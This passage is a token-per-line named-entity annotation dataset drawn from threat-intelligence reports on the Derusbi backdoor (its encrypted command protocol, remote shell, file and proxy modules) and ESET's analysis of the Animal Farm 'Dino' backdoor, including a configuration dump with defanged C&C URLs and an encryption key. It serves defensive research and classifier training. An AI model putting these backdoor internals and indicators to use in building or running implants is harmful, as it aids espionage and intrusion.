form	O
.	O
In	O
addition	O
,	O
the	O
POST	O
request	O
must	O
contain	O
a	O
Via	O
field	O
.	O
If	O
the	O
request	O
and	O
the	O
Via	O
field	O
exist	O
,	O
the	O
server	O
variant	O
authenticates	O
the	O
client	O
and	O
responds	O
with	O
If	O
the	O
client	O
's	O
request	O
does	O
not	O
meet	O
the	O
appropriate	O
authentication	O
criteria	O
,	O
the	O
server	O
variant	O
sends	O
.	O
With	O
a	O
communication	O
channel	O
between	O
the	O
server	O
variant	O
and	O
the	O
client	O
established	O
,	O
the	O
server	O
sends	O
information	O
about	O
the	O
victim	O
's	O
computer	O
.	O
Consisting	O
of	O
a	O
180	O
byte	O
data	O
structure	O
(	O
Figure	O
3	O
)	O
,	O
the	O
server	O
variant	O
provides	O
the	O
client	O
with	O
a	O
variety	O
of	O
details	O
about	O
the	O
victim	O
's	O
machine	O
.	O
The	O
VictimInfoPacket	O
has	O
an	O
identifier	O
of	O
2	O
(	O
see	O
the	O
dwPktType	O
explanation	O
below	O
)	O
.	O
The	O
communication	O
between	O
the	O
server	O
and	O
the	O
client	O
at	O
this	O
point	O
,	O
and	O
for	O
the	O
remainder	O
of	O
the	O
session	O
,	O
is	O
encrypted	O
.	O
Communication	O
between	O
the	O
client	O
and	O
the	O
server	O
variant	O
exists	O
in	O
the	O
form	O
of	O
a	O
sequence	O
of	O
encrypted	O
datagrams	O
.	O
Each	O
datagram	O
consists	O
of	O
a	O
24	O
byte	O
header	O
followed	O
by	O
an	O
optional	O
payload	O
section	O
.	O
The	O
header	O
is	O
not	O
encrypted	O
but	O
if	O
the	O
optional	O
payload	O
is	O
attached	O
,	O
the	O
payload	O
is	O
encrypted	O
using	O
a	O
DWORD	O
XOR	O
.	O
The	O
format	O
of	O
the	O
header	O
is	O
as	O
follows	O
.	O
The	O
dwTotalPacketSize	O
field	O
defines	O
the	O
total	O
size	O
of	O
the	O
datagram	O
including	O
both	O
the	O
size	O
of	O
the	O
header	O
and	O
the	O
size	O
of	O
the	O
optional	O
payload	O
.	O
The	O
dwPktType	O
field	O
correlates	O
to	O
the	O
module	O
ID	O
which	O
allows	O
the	O
server	O
variant	O
to	O
route	O
the	O
datagram	O
to	O
the	O
appropriate	O
module	O
without	O
further	O
inspection	O
of	O
the	O
payload	O
data	O
.	O
The	O
dwChecksum	O
value	O
is	O
sum	O
of	O
all	O
of	O
the	O
bytes	O
within	O
the	O
optional	O
header	O
(	O
the	O
field	O
is	O
ignored	O
,	O
but	O
present	O
,	O
if	O
there	O
is	O
no	O
payload	O
section	O
)	O
.	O
The	O
dwEncryptionKey	O
is	O
the	O
32-bit	O
XOR	O
encryption	O
key	O
for	O
the	O
payload	O
section	O
.	O
If	O
the	O
fCompressedPayload	O
field	O
is	O
non	O
-	O
zero	O
,	O
then	O
the	O
data	O
within	O
the	O
payload	O
is	O
compressed	O
using	O
LZO	O
compression	O
(	O
prior	O
to	O
XOR	O
encoding	O
)	O
and	O
the	O
dwDecompressedSize	O
field	O
represents	O
the	O
final	O
size	O
of	O
the	O
payload	O
data	O
after	O
decompression	O
.	O
The	O
payload	O
section	O
can	O
have	O
up	O
to	O
three	O
different	O
presentations	O
depending	O
on	O
if	O
compression	O
is	O
used	O
.	O
The	O
first	O
presentation	O
is	O
the	O
original	O
payload	O
data	O
as	O
generated	O
by	O
the	O
client	O
or	O
server	O
,	O
the	O
second	O
presentation	O
is	O
the	O
LZO	O
compressed	O
form	O
,	O
and	O
the	O
final	O
presentation	O
(	O
the	O
presentation	O
that	O
exists	O
going	O
across	O
the	O
network	O
)	O
is	O
the	O
32-bit	O
XOR	O
encoded	O
data	O
blob	O
.	O
Figure	O
4	O
provides	O
a	O
graphical	O
representation	O
of	O
the	O
presentation	O
types	O
of	O
the	O
payload	O
section	O
.	O
After	O
sending	O
the	O
server	B-Entity
information	I-Entity
via	B-Modifier
the	O
VictimInfoPacket	O
,	O
the	B-Entity
server	I-Entity
variant	I-Entity
spins	O
off	O
a	O
CommLoop	O
thread	O
for	O
the	O
connection	O
and	O
returns	O
to	O
waiting	O
for	O
new	O
connections	O
from	O
clients	O
to	O
appear	O
.	O
The	O
CommLoop	O
thread	O
begins	O
by	O
establishing	O
the	O
set	O
of	O
internal	O
command	O
handlers	O
available	O
to	O
the	O
server	O
variant	O
.	O
With	O
the	O
exception	O
of	O
the	O
administrative	O
command	O
handler	O
(	O
which	O
is	O
built	O
into	O
the	O
CommLoop	O
)	O
,	O
each	O
of	O
the	O
internal	O
commands	O
consists	O
of	O
an	O
object	O
derived	O
from	O
a	O
base	O
object	O
PCC_BASEMOD	O
.	O
The	O
server	O
variant	O
appears	O
to	O
have	O
a	O
modular	O
design	O
allowing	O
an	O
attacker	O
to	O
compile	O
only	O
the	O
components	O
that	O
are	O
necessary	O
for	O
any	O
given	O
operation	O
.	O
The	O
malware	O
supports	O
up	O
to	O
8	O
different	O
modules	O
per	O
sample	O
with	O
each	O
module	O
designating	O
its	O
own	O
ID	O
code	O
.	O
Novetta	O
has	O
observed	O
the	O
following	O
modules	O
.	O
Given	O
the	O
spacing	O
in	O
ID	O
numbers	O
(	O
as	O
noted	O
in	O
the	O
gap	O
between	O
0x82	O
and	O
0x84	O
in	O
an	O
otherwise	O
sequential	O
ID	O
scheme	O
)	O
,	O
it	O
is	O
conceivable	O
that	O
additional	O
modules	O
exist	O
.	O
After	O
establishing	O
the	O
tools	O
,	O
an	O
infinite	O
loop	O
(	O
CommLoop	O
)	O
is	O
entered	O
in	O
which	O
the	O
server	O
variant	O
will	O
wait	O
for	O
up	O
to	O
1/100	O
of	O
a	O
second	O
for	O
input	O
from	O
the	O
network	O
;	O
if	O
such	O
input	O
arrives	O
,	O
the	O
server	O
routes	O
the	O
packet	O
to	O
the	O
appropriate	O
handler	O
.	O
If	O
the	O
network	O
input	O
does	O
not	O
arrive	O
,	O
the	O
CommLoop	O
queries	O
each	O
of	O
the	O
command	O
handlers	O
for	O
any	O
packets	O
they	O
may	O
have	O
queued	O
(	O
by	O
calling	O
each	O
command	O
handler	O
's	O
ReadWaitingData	O
function	O
)	O
and	O
transmits	O
the	O
packets	O
the	O
handlers	O
have	O
generated	O
.	O
Additionally	O
,	O
if	O
more	O
than	O
60	O
seconds	O
passes	O
between	O
network	O
inputs	O
from	O
the	O
client	O
or	O
network	O
outputs	O
from	O
the	O
server	O
variant	O
,	O
the	O
CommLoop	O
will	O
send	O
out	O
a	O
beacon	O
packet	O
(	O
dwPktType	O
=	O
4	O
)	O
.	O
CommLoop	B-Entity
routes	B-Action
packets	B-Entity
to	B-Modifier
the	O
appropriate	B-Entity
command	I-Entity
handler	I-Entity
object	I-Entity
by	O
locating	O
the	O
dwPacketIdentifierCode	O
within	O
each	O
of	O
the	O
registered	O
command	O
handlers	O
that	O
matches	O
the	O
incoming	O
packets	O
dwPktType	O
.	O
When	O
the	O
appropriate	O
command	O
handler	O
is	O
found	O
,	O
CommLoop	O
passes	O
the	O
payload	O
of	O
portion	O
of	O
the	O
packet	O
to	O
the	O
command	O
handler	O
's	O
ProcessPacket	O
function	O
.	O
The	O
PCC_CMD	O
object	O
contains	O
the	O
remote	O
shell	O
functionality	O
of	O
the	O
server	O
variant	O
along	O
with	O
the	O
ability	O
to	O
execute	O
arbitrary	O
programs	O
.	O
Derived	O
from	O
the	O
PCC_BASEMOD	O
class	O
,	O
the	O
PCC_CMD	O
class	O
's	O
operations	O
are	O
focused	O
largely	O
in	O
the	O
ProcessPacket	O
and	O
ReadWaitingData	O
functions	O
.	O
The	O
PCC_CMD::ProcessPacket	O
function	O
works	O
as	O
a	O
stub	O
function	O
that	O
merely	O
passes	O
the	O
packet	O
's	O
payload	O
data	O
(	O
pkt	O
)	O
data	O
to	O
PCC_CMD::ProcessPacketEx	O
while	O
ignoring	O
the	O
dwPktSize	O
parameter	O
.	O
The	O
packet	O
's	O
payload	O
data	O
is	O
,	O
in	O
and	O
of	O
itself	O
,	O
another	O
datagram	O
with	O
a	O
header	O
and	O
optional	O
payload	O
section	O
.	O
The	O
payload	O
of	O
each	O
PCC_CMD	O
destined	O
packet	O
contains	O
the	O
following	O
header	O
.	O
The	O
dwCommandType	O
field	O
specifies	O
the	O
specific	O
PCC_CMD	O
command	O
that	O
the	O
client	O
is	O
requesting	O
the	O
server	O
variant	O
perform	O
.	O
There	O
are	O
four	O
commands	O
that	O
PCC_CMD	O
supports	O
.	O
For	O
each	O
of	O
the	O
commands	O
,	O
any	O
output	O
from	O
or	O
acknowledgement	O
of	O
the	O
commands	O
comes	O
in	O
the	O
form	O
of	O
another	O
packet	O
consisting	O
of	O
a	O
PacketHeader	O
followed	O
by	O
a	O
PCCCMDPacketHeader	O
and	O
any	O
optional	O
payload	O
data	O
.	O
The	O
dwCommandType	O
of	O
the	O
newly	O
constructed	O
packet	O
matches	O
the	O
command	O
's	O
original	O
dwCommandType	O
value	O
(	O
e.g.	O
responses	O
from	O
0x04	O
commands	O
will	O
reply	O
with	O
dwCommandType	O
set	O
to	O
0x04	O
)	O
.	O
PCC_CMD::ProcessPacketEx	O
will	O
queue	O
the	O
response	O
packets	O
in	O
an	O
internal	O
buffer	O
.	O
The	O
PCC_CMD::ReadWaitingData	O
member	O
function	O
is	O
responsible	O
for	O
transmitting	O
any	O
of	O
the	O
previously	O
queued	O
packets	O
from	O
PCC_CMD::ProcessPacketEx	O
.	O
If	O
there	O
are	O
no	O
queued	O
packets	O
,	O
PCC_CMD::ReadWaitingData	O
will	O
perform	O
a	O
queue	O
of	O
the	O
console	O
output	O
pipe	O
for	O
the	O
remote	O
shell	O
process	O
(	O
if	O
it	O
is	O
active	O
)	O
;	O
the	O
function	O
will	O
also	O
attempt	O
to	O
read	O
the	O
entirety	O
of	O
the	O
waiting	O
data	O
,	O
which	O
then	O
becomes	O
the	O
payload	O
of	O
a	O
PacketHeader	O
/	O
PCCCMDPacketHeader	O
based	O
packet	O
with	O
the	O
dwCommandType	O
set	O
to	O
0x0C.	O
If	O
the	O
read	O
is	O
unsuccessful	O
,	O
the	O
function	O
returns	O
a	O
PacketHeader	O
/	O
PCCCMDPacketHeader	O
based	O
packet	O
with	O
the	O
dwCommandType	O
set	O
to	O
0x10	O
indicating	O
an	O
error	O
and	O
terminating	O
the	O
remote	O
shell	O
session	O
.	O
The	O
PCC_FILE	O
object	O
provides	O
a	O
large	O
range	O
of	O
file	O
system	O
administration	O
functions	O
.	O
PCC_FILE	O
is	O
derived	O
from	O
the	O
PCC_BASEMOD	O
class	O
meaning	O
that	O
the	O
processing	O
of	O
commands	O
should	O
be	O
contained	O
within	O
the	O
PCC_FILE::ProcessPacket	O
member	O
function	O
with	O
some	O
additional	O
processing	O
done	O
in	O
the	O
PCC_FILE::ReadWaitingData	O
member	O
function	O
.	O
This	O
is	O
not	O
necessarily	O
the	O
case	O
,	O
however	O
.	O
The	O
PCC_FILE::ProcessPacket	O
member	O
function	O
,	O
much	O
like	O
PCC_CMD::ProcessPacket	O
,	O
is	O
little	O
more	O
than	O
a	O
stub	O
function	O
that	O
passes	O
only	O
a	O
copy	O
of	O
the	O
payload	O
data	O
(	O
pkt	O
)	O
to	O
PCC_FILE::ProcessPacketEx	O
.	O
PCC_FILE::ProcessPacketEx	O
performs	O
no	O
file	O
management	O
operations	O
but	O
instead	O
adds	O
any	O
incoming	O
command	O
packets	O
to	O
a	O
queue	O
for	O
processing	O
by	O
PCC_FILE::ReadWaitingData	O
if	O
the	O
packet	O
is	O
not	O
already	O
within	O
the	O
queue	O
(	O
thus	O
avoiding	O
duplication	O
of	O
commands	O
)	O
.	O
The	O
PCC_FILE::ReadWaitingData	O
member	O
function	O
is	O
a	O
stub	O
function	O
that	O
calls	O
PCC_FILE::ProcessQueue	O
and	O
returns	O
the	O
resulting	O
packet	O
from	O
the	O
queue	O
processing	O
.	O
This	O
means	O
that	O
file	O
operations	O
are	O
surprisingly	O
low	O
priority	O
,	O
and	O
potentially	O
,	O
high	O
latency	O
operations	O
.	O
Each	O
packet	O
that	O
arrives	O
within	O
the	O
packet	O
queue	O
of	O
PCC_FILE	O
contains	O
a	O
standard	O
header	O
followed	O
by	O
a	O
(	O
quasi	O
-	O
optional	O
)	O
payload	O
data	O
blob	O
.	O
The	O
header	O
for	O
the	O
PCC_FILE	O
command	O
packets	O
takes	O
the	O
following	O
form	O
.	O
The	O
dwCommandType	O
field	O
specifies	O
the	O
specific	O
PCC_FILE	O
command	O
that	O
the	O
client	O
is	O
requesting	O
the	O
server	O
variant	O
to	O
perform	O
.	O
PCC_FILE	O
supports	O
17	O
(	O
of	O
which	O
15	O
are	O
unique	O
)	O
commands	B-Entity
.	O
While	O
the	O
general	O
form	O
within	O
the	O
Derusbi	O
server	O
variant	O
communication	O
model	O
is	O
to	O
return	O
a	O
packet	O
with	O
the	O
same	O
dwCommandType	O
as	O
the	O
original	O
command	O
,	O
many	O
of	O
the	O
PCC_FILE	O
commands	O
return	O
a	O
status	O
packet	O
type	O
(	O
dwCommandType	O
=	O
0x04	O
)	O
.	O
Commands	O
0x2C	O
,	O
0x44	O
,	O
and	O
0x48	O
all	O
appear	O
to	O
be	O
the	O
exact	O
same	O
base	O
command	O
with	O
only	O
slight	O
variations	O
in	O
their	O
response	O
format	O
.	O
It	O
is	O
unclear	O
why	O
this	O
particular	O
command	O
is	O
included	O
three	O
times	O
in	O
PCC_FILE	O
.	O
The	O
PCC_PROXY	O
object	O
provides	O
the	O
platform	O
for	O
a	O
tunneling	O
network	O
traffic	O
to	O
and	O
from	O
the	O
client	O
to	O
a	O
specific	O
endpoint	O
(	O
or	O
endpoints	O
if	O
multiple	O
tunnels	O
are	O
activated	O
by	O
the	O
client	O
)	O
.	O
Derived	O
on	O
the	O
PCC_BASEMOD	O
class	O
,	O
the	O
PCC_PROXY	O
class	O
performs	O
very	O
little	O
network	O
tunneling	O
within	O
the	O
CommLoop	O
interactive	O
PCC_PROXY::ProcessPacket	O
and	O
PCC_PROXY::ReadWaitingData	O
member	O
functions	O
.	O
The	O
PCC_PROXY::ProcessPacket	O
member	O
function	O
queues	O
incoming	O
PCC_PROXY	O
packets	O
into	O
a	O
received	O
queue	O
while	O
PCC_PROXY::ReadWaitingData	O
returns	O
packets	O
from	O
a	O
transmit	O
queue	O
,	O
with	O
the	O
directionality	O
from	O
the	O
perspective	O
of	O
the	O
server	O
variant	O
.	O
The	O
core	O
of	O
the	O
PCC_PROXY	O
's	O
network	O
tunneling	O
comes	O
from	O
a	O
spawned	O
processing	O
thread	O
(	O
PCC_PROXY::MainThread	O
)	O
that	O
is	O
generated	O
when	O
the	O
PCC_PROXY	O
object	O
is	O
instantiated	O
.	O
The	O
PCC_PROXY::MainThread	O
function	O
consist	O
an	O
infinite	O
loop	O
that	O
only	O
terminates	O
when	O
the	O
PCC_PROXY::fShutdown	O
flag	O
is	O
set	O
.	O
Otherwise	O
,	O
the	O
loop	O
will	O
inspect	O
another	O
internal	O
flag	O
(	O
PCC_PROXY::fNetworkEnabled	O
)	O
to	O
determine	O
if	O
the	O
network	O
tunneling	O
is	O
currently	O
active	O
.	O
If	O
the	O
PCC_PROXY::fNetworkEnabled	O
flag	O
is	O
set	O
to	O
false	O
,	O
then	O
tunneling	O
is	O
disabled	O
but	O
command	O
processing	O
continues	O
.	O
It	O
is	O
possible	O
to	O
have	O
more	O
than	O
one	O
tunnel	O
active	O
at	O
any	O
given	O
time	O
.	O
In	O
order	O
to	O
firewall	O
tunnels	O
from	O
each	O
other	O
over	O
the	O
backbone	O
of	O
the	O
server	O
variant	O
's	O
command	O
channel	O
,	O
each	O
tunnel	O
is	O
assigned	O
a	O
specific	O
channel	O
identifier	O
.	O
This	O
allows	O
the	O
client	O
to	O
specify	O
which	O
specific	O
tunnel	O
data	O
is	O
transmitted	O
to	O
as	O
well	O
as	O
telling	O
the	O
client	O
which	O
tunnel	O
is	O
returning	O
data	O
.	O
If	O
the	O
PCC_PROXY::fNetworkEnabled	O
flag	O
is	O
set	O
to	O
true	O
,	O
PRC_PROXY::MainThread	O
will	O
loop	O
through	O
all	O
active	O
channels	O
,	O
perform	O
a	O
select	O
on	O
the	O
socket	O
connected	O
to	O
the	O
endpoint	O
and	O
--	O
if	O
the	O
select	O
indicates	O
that	O
there	O
is	O
data	O
waiting	O
on	O
a	O
particular	O
socket	O
--	O
the	O
data	O
is	O
read	O
.	O
A	O
new	O
PCC_PROXY	O
based	O
packet	O
is	O
then	O
generated	B-Action
and	O
the	O
packet	O
is	O
queued	O
for	O
delivery	O
to	O
the	O
client	O
.	O
After	O
processing	O
each	O
of	O
the	O
channels	O
for	O
new	O
data	O
,	O
PCC_PROXY::MainThread	O
processes	O
incoming	O
command	O
packets	O
from	O
the	O
client	O
(	O
an	O
operation	O
usually	O
handled	O
by	O
the	O
PCC_BASEMOD::ProcessPacket	O
function	O
)	O
.	O
Packets	O
belonging	O
to	O
the	O
PCC_PROXY	O
subsystem	O
have	O
a	O
common	O
header	O
,	O
much	O
like	O
the	O
other	O
PCC_BASEMOD	O
derived	O
classes	O
.	O
To	O
this	O
end	O
,	O
the	O
PCC_PROXY	O
packets	O
have	O
the	O
same	O
packet	O
header	O
as	O
the	O
PCCFilePacketHeader	O
packet	O
header	O
.	O
The	O
PCC_PROXY	O
supports	O
five	O
commands	O
.	O
The	O
administrative	O
commands	O
are	O
built	O
-	O
in	O
to	O
the	O
server	O
variant	O
and	O
are	O
not	O
derived	O
from	O
the	O
PCC_BASEMOD	O
class	O
.	O
Each	O
of	O
the	O
administrative	O
command	O
packets	O
contains	O
the	O
same	O
header	O
structure	O
as	O
the	O
PCCFilePacketHeader	O
structure	O
followed	O
by	O
an	O
optional	O
payload	O
data	O
blob	O
.	O
The	O
administrative	O
commands	O
consist	O
of	O
the	O
following	O
five	O
commands	O
.	O
Given	O
the	O
encrypted	O
,	O
and	O
potentially	O
compressed	O
,	O
nature	O
of	O
Derusbi	O
server	O
variant	O
network	O
traffic	O
,	O
detecting	O
the	O
traffic	O
on	O
a	O
network	O
can	O
be	O
problematic	O
using	O
traditional	O
IDS	O
signatures	O
.	O
Using	O
a	O
heuristic	O
approach	O
,	O
it	O
would	O
be	O
possible	O
to	O
detect	O
the	O
handshake	O
of	O
a	O
possible	O
Derusbi	O
server	O
variant	O
session	O
by	O
looking	O
for	O
the	O
following	O
pattern	O
.	O
Detecting	O
Derusbi	O
server	O
variants	O
on	O
disk	O
is	O
possible	O
using	O
the	O
following	O
YARA	O
signature	O
.	O
Security	O
news	O
,	O
views	O
and	O
insight	O
from	O
the	O
ESET	O
experts	O
BY	O
JOAN	O
CALVET	O
POSTED	O
30	O
JUN	O
2015	O
11:12AM	O
In	O
this	O
blog	O
we	O
describe	O
a	O
sophisticated	O
backdoor	O
,	O
called	O
Dino	O
by	O
its	O
creators	O
.	O
We	O
believe	O
this	O
malicious	O
software	O
has	O
been	O
developed	O
by	O
the	O
Animal	O
Farm	O
espionage	O
group	O
,	O
who	O
also	O
created	O
the	O
infamous	O
Casper	O
,	O
Bunny	O
and	O
Babar	O
malware	O
.	O
Dino	O
contains	O
interesting	O
technical	O
features	O
,	O
and	O
also	O
a	O
few	O
hints	O
that	O
the	O
developers	O
are	O
French	O
speaking	O
.	O
Animal	O
Farm	O
is	O
the	O
security	O
industry	O
's	O
name	O
for	O
a	O
group	O
of	O
attackers	O
first	O
described	O
by	O
Canada	O
's	O
Communications	O
Security	O
Establishment	O
(	O
CSE	O
)	O
in	O
a	O
set	O
of	O
slides	O
leaked	O
by	O
Edward	O
Snowden	O
in	O
March	O
2014	O
.	O
In	O
those	O
slides	O
CSE	O
assess	O
with	O
"	O
moderate	O
certainty	O
"	O
that	O
this	O
group	O
is	O
a	O
French	O
intelligence	O
agency	O
.	O
Since	O
then	O
,	O
several	O
examples	O
of	O
malware	O
created	O
by	O
Animal	O
Farm	O
have	O
been	O
found	O
and	O
publicly	O
documented	O
,	O
in	O
particular	O
.	O
Casper	O
,	O
a	O
stealthy	O
first	O
stage	O
implant	O
,	O
documented	O
by	O
ESET	O
in	O
last	O
March	O
Bunny	O
,	O
a	O
Lua	O
based	O
backdoor	O
,	O
documented	O
by	O
Marion	O
Marschalek	O
(	O
Cyphort	O
)	O
Babar	O
,	O
an	O
espionage	O
platform	O
,	O
also	O
analyzed	O
by	O
Marion	O
Marschalek	O
The	O
connection	O
between	O
those	O
pieces	O
of	O
malware	O
and	O
the	O
group	O
described	O
in	O
CSE	O
slides	O
has	O
been	O
convincingly	O
established	O
,	O
for	O
example	O
by	O
Paul	O
Rascagn	O
res	O
(	O
G	O
Data	O
)	O
.	O
In	O
this	O
blog	O
post	O
we	O
add	O
a	O
new	O
piece	O
to	O
the	O
puzzle	O
with	O
Dino	O
,	O
another	O
malicious	O
program	O
belonging	O
to	O
Animal	O
Farm	O
's	O
arsenal	O
.	O
The	O
sample	O
of	O
Dino	O
documented	O
in	O
this	O
blog	O
post	O
was	O
used	O
in	O
2013	O
against	O
targets	O
in	O
Iran	O
.	O
The	O
original	O
means	O
of	O
infection	O
is	O
unknown	O
,	O
though	O
we	O
believe	O
Dino	O
was	O
installed	O
by	O
another	O
program	O
,	O
as	O
it	O
contains	O
an	O
uninstallation	O
command	O
without	O
the	O
corresponding	O
installation	O
procedure	O
.	O
Given	O
the	O
set	O
of	O
commands	O
it	O
can	O
receive	O
,	O
Dino	B-Entity
's	I-Entity
main	I-Entity
goal	I-Entity
seems	O
to	O
be	O
the	O
exfiltration	B-Entity
of	I-Entity
files	I-Entity
from	O
its	O
targets	O
.	O
The	O
binary	O
's	O
original	O
name	O
,	O
"	O
Dino.exe	O
"	O
,	O
has	O
been	O
left	O
visible	O
by	O
its	O
authors	O
,	O
as	O
was	O
the	O
case	O
with	O
Casper	O
.	O
Dino	O
–	O
which	O
could	O
be	O
referring	O
to	O
the	O
pet	O
character	O
from	O
The	O
Flintstones	O
cartoon	O
show	O
–	O
was	O
already	O
mentioned	O
in	O
a	O
recent	O
Kaspersky	O
blog	O
as	O
a	O
"	O
full	O
featured	O
espionage	O
platform	O
,	O
"	O
but	O
no	O
technical	O
analysis	O
has	O
been	O
published	O
yet	O
.	O
Roughly	O
,	O
Dino	O
can	O
be	O
described	O
as	O
an	O
elaborate	O
backdoor	O
built	O
in	O
a	O
modular	O
fashion	O
.	O
Among	O
its	O
technical	O
innovations	O
,	O
there	O
is	O
a	O
custom	O
file	O
system	O
to	O
execute	B-Action
commands	B-Entity
in	O
a	O
stealthy	B-Entity
fashion	I-Entity
,	O
and	O
a	O
complex	O
task	O
scheduling	O
module	O
working	O
in	O
a	O
similar	O
way	O
to	O
the	O
"	O
cron	O
"	O
Unix	O
command	O
.	O
Interestingly	O
,	O
the	O
binary	O
contains	O
a	O
lot	O
of	O
verbose	O
error	O
messages	O
,	O
allowing	O
us	O
to	O
see	O
Dino	O
's	O
developers	O
'	O
choice	O
of	O
wording	O
.	O
Also	O
,	O
a	O
few	O
technical	O
artefacts	O
suggest	O
that	O
Dino	O
was	O
authored	O
by	O
native	O
French	O
speakers	O
.	O
Dino	O
has	O
been	O
developed	O
in	O
C++	O
and	O
presents	O
a	O
well	O
defined	O
modular	O
architecture	O
.	O
The	O
following	O
array	O
lists	O
the	O
modules	O
contained	O
in	O
this	O
Dino	O
binary;	O
the	O
module	O
names	O
are	O
those	O
assigned	O
by	O
the	O
developers	O
.	O
Dino	O
heavily	O
relies	O
on	O
a	O
custom	O
data	O
structure	O
named	O
"	O
DataStore	O
"	O
by	O
the	O
Animal	O
Farm	O
developers	O
.	O
In	O
particular	O
,	O
all	O
Dino	O
's	O
modules	O
store	O
their	O
content	O
inside	O
this	O
structure	O
,	O
making	O
its	O
understanding	O
one	O
of	O
the	O
keys	O
to	O
analyzing	O
Dino	O
.	O
A	O
DataStore	O
is	O
a	O
map	O
from	O
string	O
keys	O
to	O
values	O
of	O
8	O
possible	O
types	O
,	O
such	O
as	O
integers	O
or	O
strings	O
.	O
The	O
implementation	O
of	O
this	O
data	O
structure	O
is	O
based	O
on	O
a	O
hash	O
table	O
.	O
It	O
means	O
that	O
to	O
retrieve	O
the	O
value	O
associated	O
with	O
a	O
key	O
,	O
one	O
has	O
to	O
calculate	O
the	O
hash	O
of	O
the	O
key	O
to	O
locate	O
a	O
bucket	O
from	O
which	O
the	O
value	O
can	O
be	O
retrieved	O
.	O
Dino	O
's	O
hash	O
is	O
a	O
one	O
byte	O
value	O
calculated	O
with	O
a	O
series	O
of	O
XOR	O
operations	O
on	O
the	O
key	O
,	O
and	O
each	O
bucket	O
starts	O
a	O
linked	O
list	O
containing	O
key	O
/	O
value	O
pairs	O
.	O
The	O
code	O
responsible	O
for	O
retrieving	O
the	O
value	O
associated	O
with	O
a	O
key	O
is	O
shown	O
in	O
Figure	O
1	O
.	O
Finally	O
,	O
DataStore	O
objects	O
can	O
be	O
serialized	O
in	O
a	O
custom	O
format	O
,	O
which	O
begins	O
with	O
the	O
magic	O
word	O
"	O
DxSx	O
"	O
.	O
This	O
is	O
used	O
in	O
particular	O
by	O
the	O
PSM	B-Entity
module	I-Entity
to	B-Modifier
save	O
the	O
content	B-Entity
of	I-Entity
Dino	I-Entity
modules	I-Entity
in	O
an	O
encrypted	B-Entity
file	I-Entity
.	O
More	O
precisely	O
,	O
when	O
a	O
modification	O
is	O
made	O
to	O
a	O
module	O
's	O
content	O
in	O
memory	O
,	O
the	O
PSM	O
module	O
saves	O
it	O
as	O
a	O
serialized	O
DataStore	O
.	O
When	O
Dino	O
restarts	O
,	O
the	O
module	O
is	O
deserialized	O
from	O
the	O
file	O
and	O
loaded	O
into	O
memory	O
.	O
Funnily	O
enough	O
,	O
the	O
key	O
serving	O
to	O
encrypt	O
the	O
file	O
on	O
disk	O
is	O
"	O
PsmIsANiceM0du1eWith0SugarInside	O
"	O
.	O
Dino	O
's	O
configuration	O
is	O
initially	O
stored	O
in	O
a	O
serialized	O
DataStore	O
object	O
contained	O
in	O
a	O
zip	O
archive	O
at	O
the	O
end	O
of	O
the	O
Dino	O
binary	O
.	O
At	O
runtime	O
this	O
object	O
is	O
deserialized	O
and	O
stored	O
inside	O
the	O
CORE	O
module	O
.	O
We	O
can	O
list	O
the	O
configuration	O
's	O
content	O
with	O
Dino	O
's	O
"	O
conf	O
–l	O
CORE	O
"	O
command	O
–	O
described	O
later	O
–	O
which	O
displays	O
on	O
separate	O
rows	O
each	O
key	O
's	O
name	O
,	O
its	O
associated	O
value	O
and	O
the	O
type	O
of	O
this	O
value	O
.	O
Started:5523F782	O
QWORD	O
InitialWaitDone:00000001	O
DWORD	O
InteractiveDelay:00000005	O
DWORD	O
MaxNothingSaidCount:00000078	O
DWORD	O
InstallDate	O
:	O
5523F782	O
QWORD	O
fields:78537844	O
…	O
[REDACTED]	O
…	O
66B3900	O
BYTES	O
recID:11173	O
01	O
PRS	O
WIDESTR	O
Version:1.2	O
WIDESTR	O
BD_Keys	O
:	O
4D41474943424F58	O
…	O
[REDACTED]	O
…	O
9EB3506	O
BYTES	O
CC_Keys	O
:	O
4D41474943424F58	O
…	O
[REDACTED]	O
…	O
0000000	O
BYTES	O
MaxDelay:00000E10	O
DWORD	O
ComServer0:hXXp://www.azhar.bf/	O
…	O
[REDACTED]	O
…	O
/postal.php	O
STR	O
ComServer1:hXXp://www.rsvniima.org/	O
…	O
[REDACTED]	O
…	O
/din12/postal.php	O
STR	O
ComServer2:hXXp://www.azhar.bf/	O
…	O
[REDACTED]	O
…	O
/postal.php	O
STR	O
ComServer3:hXXp://www.rsvniima.org/	O
…	O
[REDACTED]	O
…	O
/din12/postal.php	O
STR	O
ComServer4:hXXp://dneprorudnoe.info//	O
…	O
[REDACTED]	O
…	O
/postal.php	O
STR	O
ComServer5:hXXp://dneprorudnoe.info//	O
…	O
[REDACTED]	O
…	O
/postal.php	O
STR	O
ComServer6:hXXp://dneprorudnoe.info//	O
…	O
[REDACTED]	O
…	O
/postal.php	O
STR	O
NextSendReceive:5CC33097FB72D001	O
BYTES	O
CC:000064F7	O
72E4	O
3F7D	O
C817	O
474D	O
A9BDBDF7	O
STR	O
DaysOfLife:00000000	O
DWORD	O
GUID:12FEB4A9EEDEE411B283000C29FD2872	O
BYTES	O
InitialDelay:00000000	O
DWORD	O
now:5523F78E	O
QWORD	O
hash	O
:	O
A88E8181CA5CE35AE70C76145DFB820D	O
BYTES	O
InitialCommands:78537844	O
…	O
[REDACTED]	O
…	O
000000	O
BYTES	O
xT0rvwz	O
:	O
DC188352A	O
…	O
[REDACTED]	O
…	O
00000	O
BYTES	O
tr4qa589:K/[RAFtIP?ciD?:D	O
STR	O
jopcft4T	O
:	O
a.ini	O
WIDESTR	O
While	O
most	O
of	O
the	O
keys	O
have	O
self	O
explanatory	O
names	O
,	O
we	O
would	O
like	O
to	O
focus	O
on	O
the	O
following	O
keys	O
.	O
"	O
recID	O
"	O
:	O
Animal	O
Farms	O
binaries	O
contain	O
an	O
ID	O
whose	O
decimal	O
value	O
appears	O
to	O
identify	O
the	O
target	O
,	O
"	O
11173	O
01	O
PRS	O
"	O
in	O
this	O
case	O
.	O
For	O
example	O
Casper	O
used	O
an	O
"	O
ID	O
"	O
value	O
set	O
to	O
"	O
13001	O
"	O
,	O
whereas	O
some	O
Babar	O
samples	O
used	O
"	O
12075	O
01	O
"	O
and	O
"	O
11162	O
01	O
"	O
.	O
We	O
do	O
not	O
know	O
the	O
meaning	O
of	O
the	O
"	O
PRS	O
"	O
suffix	O
added	O
in	O
the	O
case	O
of	O
Dino	O
.	O
"	O
ComServer	O
"	O
:	O
These	B-Entity
keys	I-Entity
contain	O
the	O
command	B-Entity
and	I-Entity
control	I-Entity
(	I-Entity
C&C	I-Entity
)	I-Entity
servers	I-Entity
'	I-Entity
URLs	I-Entity
.	O
